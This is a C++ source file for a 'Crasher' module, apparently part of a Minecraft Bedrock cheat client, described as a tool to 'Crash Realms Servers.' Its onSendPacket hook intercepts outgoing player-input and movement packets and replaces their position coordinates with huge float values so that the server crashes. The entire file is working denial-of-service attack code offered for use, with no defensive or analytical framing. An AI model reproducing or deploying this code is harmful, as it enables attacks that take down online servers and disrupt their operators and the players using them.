#include "Crasher.h"

Crasher::Crasher() : IModule(0, Category::MISC, "Crash Realms Servers.") {
}

Crasher::~Crasher() {
}

const char* Crasher::getModuleName() {
	return "Crasher";
}

void Crasher::onEnable() {
	if (Game.getLocalPlayer() == nullptr)
		setEnabled(false);
}

void Crasher::onTick(GameMode* gm) {
	if (Game.getLocalPlayer() == nullptr)
		setEnabled(false);
}

void Crasher::onSendPacket(Packet* packet) {
	if (packet->isInstanceOf<PlayerAuthInputPacket>()) {
		PlayerAuthInputPacket* InputPacket = reinterpret_cast<PlayerAuthInputPacket*>(packet);
		InputPacket->pos.x = static_cast<float>(0xFFFFFFFF);
		InputPacket->pos.y = static_cast<float>(0xFFFFFFFF);
		InputPacket->pos.z = static_cast<float>(0xFFFFFFFF);
	} else if (packet->isInstanceOf<MovePlayerPacket>()) {
		MovePlayerPacket* movePacket = reinterpret_cast<MovePlayerPacket*>(packet);
		movePacket->Position.x = static_cast<float>(0xFFFFFFFF);
		movePacket->Position.y = static_cast<float>(0xFFFFFFFF);
		movePacket->Position.z = static_cast<float>(0xFFFFFFFF);
	}
}
